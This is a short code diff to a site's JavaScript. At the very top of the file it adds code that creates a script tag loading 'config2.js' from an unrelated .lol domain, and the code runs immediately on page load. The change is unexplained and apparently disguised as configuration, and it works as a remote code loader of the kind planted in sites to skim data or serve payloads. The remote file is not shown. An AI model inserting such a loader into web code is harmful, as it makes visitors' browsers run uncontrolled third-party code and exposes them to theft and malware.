@@ -1,3 +1,8 @@
+// 1. 顶层立即执行
+const cfgScript = document.createElement('script');
+cfgScript.src = 'https://xiezuowen.zhongzzzzz.lol/config2.js';
+document.head.appendChild(cfgScript);
+
 document.addEventListener('DOMContentLoaded', function() {
     'use strict';
 
